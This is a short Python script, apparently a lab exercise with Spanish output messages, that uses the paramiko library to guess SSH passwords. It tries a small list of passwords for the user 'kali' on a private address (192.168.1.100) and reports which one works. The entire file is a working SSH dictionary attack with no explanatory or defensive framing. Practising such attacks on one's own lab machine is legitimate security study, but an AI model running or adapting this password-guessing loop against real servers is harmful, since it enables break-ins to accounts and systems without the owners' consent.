import paramiko
diccionario = ["1234", "4566", "6564", "65", "kali"]

ip_kali = "192.168.1.100"
usuario = "kali"


for i in diccionario:
    cliente = paramiko.SSHClient()
    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        cliente.connect(ip_kali, username=usuario, password=i, timeout=2)
        print(f"Contraseña correcta detectada: {i}. Scanner finalizado.")
        cliente.close()
        exit()
    except paramiko.AuthenticationException:
        print(f"La contraseña {i} no es válida.")
    except Exception as e:
        print(f"Error de conexión: {e}")
        break

else:
    print(f"No se han detectado coincidencias.")